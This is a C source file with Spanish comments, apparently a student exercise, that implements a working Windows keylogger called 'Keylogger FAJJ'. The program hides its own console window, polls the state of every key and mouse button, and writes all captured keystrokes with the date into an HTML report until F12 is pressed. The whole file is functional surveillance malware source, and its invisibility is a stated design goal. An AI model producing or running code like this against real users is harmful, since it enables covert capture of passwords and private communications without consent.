/* 
	Programa: Keylogger C
	Lenguaje: C

	
	Descripción: Elaborar un programa que capture las teclas pulsadas por el teclado...
		El programa debera:
			1) Capturar los números, el abecedario y teclas especiales.
			2) Ocultar la consola de Windows (que sea invisible).
			3) Genere un reporte en formato HTML con:
				* Fecha
				* Teclas pulsadas
			4) Detener su ejecución al pulsar F12.	
			5) Mostrar el reporte una vez finalizado el programa.
	NOTA: Guardar el documento en el escritorio de Windows para la prueba.
*/

//------------------------------------------------------------------------------
// Librerías incluidas
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

// ------------------------------------------------------------------------------
// Programa principal
int main(int argc, char *argv[]){
	short chr=0;
	FILE *data;
	time_t t;
  	struct tm *tm;
  	char fechayhora[100];
  	char *meses[12]={"Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"};
  	t=time(NULL);
  	tm=localtime(&t);
  	int i = 1;
	// Eliminamos el archivo anterior.
	remove("reporte.html");
	
	// Ocultamos la consola
	FreeConsole();
	// Abrimos el archivo
	data = fopen("reporte.html", "a+");
	
	// Generamos la primera parte del HTML
	fprintf(data, "<!DOCTYPE html>\n");
	fprintf(data, "	<html lang=\"es\">\n");
	fprintf(data, "		<head>\n");
	fprintf(data, "			<title>Reporte</title>\n");
	fprintf(data, "			<meta charset=\"UTF-8\">\n");
	fprintf(data, "			<style>\n");
	fprintf(data, "				html{\n");
	fprintf(data, "					background: rgb(250, 250, 250);\n");
	fprintf(data, "					font-family: \"Courier New\", \"Sans Serif\";\n");
	fprintf(data, "				}\n");
	fprintf(data, "				body{\n");
	fprintf(data, "					border: 1px solid rgb(150, 150, 150);\n");
	fprintf(data, "					box-shadow: 2px 2px 3px rgb(200, 200, 200);\n");
	fprintf(data, "					margin: auto;\n");
	fprintf(data, "					margin-top: 15px;\n");
	fprintf(data, "					margin-bottom: 15px;\n");
	fprintf(data, "					border-radius: 10px;\n");
	fprintf(data, "					width: 95%%;\n");
	fprintf(data, "					background: rgb(255, 255, 255);\n");
	fprintf(data, "					max-width: 800px;\n");
	fprintf(data, "					overflow: hidden;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				header, footer {\n");
	fprintf(data, "					background: rgb(240, 240, 240);\n");
	fprintf(data, "					padding: 15px;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				header{\n");
	fprintf(data, "					border-radius: 10px 10px 0px 0px;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				footer {\n");
	fprintf(data, "					border-radius: 0px 0px 10px 10px;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				header h1, header h2, footer p{\n");
	fprintf(data, "					margin: 0px;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				h1, h2, p, hr {\n");
	fprintf(data, "					color: rgb(70, 70, 70);\n");
	fprintf(data, "					margin: 15px;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				.tecla_especial{\n");
	fprintf(data, "					background: rgb(240, 240, 240);\n");
	fprintf(data, "					border: 1px solid rgb(240, 240, 240);\n");
	fprintf(data, "					font-size: 12px;\n");
	fprintf(data, "					box-shadow: 1px 1px 0px rgb(250, 250, 250);\n");
	fprintf(data, "					color: rgb(80, 80, 80);\n");
	fprintf(data, "					font-weight: bold;\n");
	fprintf(data, "					margin-left: 2px;\n");
	fprintf(data, "					margin-right: 2px;\n");
	fprintf(data, "					border-radius: 3px;\n");
	fprintf(data, "				}\n");
	fprintf(data, "				.tecla_especial:hover{\n");
	fprintf(data, "					background: rgb(230, 230, 230);\n");
	fprintf(data, "					border: 1px solid rgb(230, 230, 230);\n");
	fprintf(data, "					box-shadow: 2px 2px 1px rgb(240, 240, 240);\n");
	fprintf(data, "				}\n");
	fprintf(data, "				footer p{\n");
	fprintf(data, "					text-align: center;\n");
	fprintf(data, "				}\n");
	fprintf(data, "			</style>\n");
	fprintf(data, "		</head>\n");
	fprintf(data, "		<body>\n");
	fprintf(data, "			<header>\n");
	fprintf(data, "				<h1>Keylogger FAJJ</h1>\n");
	fprintf(data, "				<h2>Captura correspondiente al %02d de %s de %d</h2>\n", tm->tm_mday, meses[tm->tm_mon], 1900+tm->tm_year);
	fprintf(data, "			</header>\n");
	fprintf(data, "			<hr>\n");
	fprintf(data, "				<p>\n");
	// Comienza proceso de guardado...
	while(1){
		if(GetAsyncKeyState(chr++)==-32767){
			switch(chr-1){
				case 1:	fprintf(data, "<span class=\"tecla_especial\">(CLICIZQ)</span>");	break;
				case 2:	fprintf(data, "<span class=\"tecla_especial\">(CLICDER)</span>");	break;
				case 8:	fprintf(data, "<span class=\"tecla_especial\">(BACKSPACE)</span>");	break;
				case 9:	fprintf(data, "<span class=\"tecla_especial\">(TAB)</span>");	break;
				case 13:	fprintf(data, "<span class=\"tecla_especial\">(ENTER)</span><br>");	break;
				case 16:	fprintf(data, "<span class=\"tecla_especial\">(SHIFT)</span>");	break;
				case 17:	fprintf(data, "<span class=\"tecla_especial\">(CONTROL)</span>");	break;
				case 18:	fprintf(data, "<span class=\"tecla_especial\">(ALT)</span>");	break;
				case 19:	fprintf(data, "<span class=\"tecla_especial\">(PAUSE)</span>");	break;
				case 20:	fprintf(data, "<span class=\"tecla_especial\">(CAPSLOCK)</span>");	break;
				case 27:	fprintf(data, "<span class=\"tecla_especial\">(ESCAPE)</span>");	break;
				case 32:	fprintf(data, " ");	break;
				case 33:	fprintf(data, "<span class=\"tecla_especial\">(PAGEUP)</span>");	break;
				case 34:	fprintf(data, "<span class=\"tecla_especial\">(PAGEDOWN)</span>");	break;
				case 35:	fprintf(data, "<span class=\"tecla_especial\">(END)</span>");	break;
				case 36:	fprintf(data, "<span class=\"tecla_especial\">(HOME)</span>");	break;
				case 37:	fprintf(data, "<span class=\"tecla_especial\">(LEFT)</span>");	break;
				case 38:	fprintf(data, "<span class=\"tecla_especial\">(UP)</span>");	break;
				case 39:	fprintf(data, "<span class=\"tecla_especial\">(RIGHT)</span>");	break;
				case 40:	fprintf(data, "<span class=\"tecla_especial\">(DOWN)</span>");	break;
				case 44:	fprintf(data, "<span class=\"tecla_especial\">(PRINTSCREEN)</span>");	break;
				case 45:	fprintf(data, "<span class=\"tecla_especial\">(INSERT)</span>");	break;
				case 46:	fprintf(data, "<span class=\"tecla_especial\">(DELETE)</span>");	break;
				case 112:	fprintf(data, "<span class=\"tecla_especial\">(F1)</span>");	break;
				case 113:	fprintf(data, "<span class=\"tecla_especial\">(F2)</span>");	break;
				case 114:	fprintf(data, "<span class=\"tecla_especial\">(F3)</span>");	break;
				case 115:	fprintf(data, "<span class=\"tecla_especial\">(F4)</span>");	break;
				case 116:	fprintf(data, "<span class=\"tecla_especial\">(F5)</span>");	break;
				case 117:	fprintf(data, "<span class=\"tecla_especial\">(F6)</span>");	break;
				case 118:	fprintf(data, "<span class=\"tecla_especial\">(F7)</span>");	break;
				case 119:	fprintf(data, "<span class=\"tecla_especial\">(F8)</span>");	break;
				case 120:	fprintf(data, "<span class=\"tecla_especial\">(F9)</span>");	break;
				case 121:	fprintf(data, "<span class=\"tecla_especial\">(F10)</span>");	break;
				case 122:	fprintf(data, "<span class=\"tecla_especial\">(F11)</span>");	break;
				case 123:	fprintf(data, "<span class=\"tecla_especial\">(F12)</span>");	break;
				case 124:	fprintf(data, "<span class=\"tecla_especial\">(F13)</span>");	break;
				case 125:	fprintf(data, "<span class=\"tecla_especial\">(F14)</span>");	break;
				case 126:	fprintf(data, "<span class=\"tecla_especial\">(F15)</span>");	break;
				case 127:	fprintf(data, "<span class=\"tecla_especial\">(F16)</span>");	break;
				case 144:	fprintf(data, "<span class=\"tecla_especial\">(NUMLOCK)</span>");	break;
				case 145:	fprintf(data, "<span class=\"tecla_especial\">(SCROLLLOCK)</span>");	break;
				case 160:	//fprintf(data, "<span class=\"tecla_especial\">(LSHIFT)</span>");	break;
				case 161:	//fprintf(data, "<span class=\"tecla_especial\">(RSHIFT)</span>");	break;
				case 162:	//fprintf(data, "<span class=\"tecla_especial\">(LCONTROL)</span>");	break;
				case 163:	//fprintf(data, "<span class=\"tecla_especial\">(RCONTROL)</span>");	break;
				case 164:	//fprintf(data, "<span class=\"tecla_especial\">(LALT)</span>");	break;
				case 165:	//fprintf(data, "<span class=\"tecla_especial\">(RALT)</span>");	break;
				case 220:	fprintf(data, "|");	break;
				case 219:	fprintf(data, "'");	break;
				case 221:	fprintf(data, "<span class=\"tecla_especial\">(ABRIRINTERROGACION)</span>");	break;
				case 191:	fprintf(data, "}");	break;
				case 186:	fprintf(data, "(ACENTO)");	break;
				case 187:	fprintf(data, "+");	break;
				case 192:	fprintf(data, "(ENIE)");	break;
				case 222:	fprintf(data, "{");	break;
				case 188:	fprintf(data, ",");	break;
				case 190:	fprintf(data, ".");	break;
				case 189:	fprintf(data, "-");	break;
				case 226:	fprintf(data, "<");	break;
				default:	fprintf(data, "%c", chr-1);	break;
			}
				
			if(chr==124) // Si se pulsa F12, detener Keyloger FAJJ
				break;
		}
		if(chr>=255)
			chr=0;
	}

	// Generamos ultima parte del HTML
	fprintf(data, "				</p>\n");
	fprintf(data, "			<hr>\n");
	fprintf(data, "			<footer>\n");
	fprintf(data, "			</footer>\n");
	fprintf(data, "		</body>\n");
	fprintf(data, "	</html>\n");
	fclose(data); // Cerramos el archivo
	//system("start C:\\Users\\ctamayo\\Desktop\\reporte.html"); // Abrimos con el navegador
}
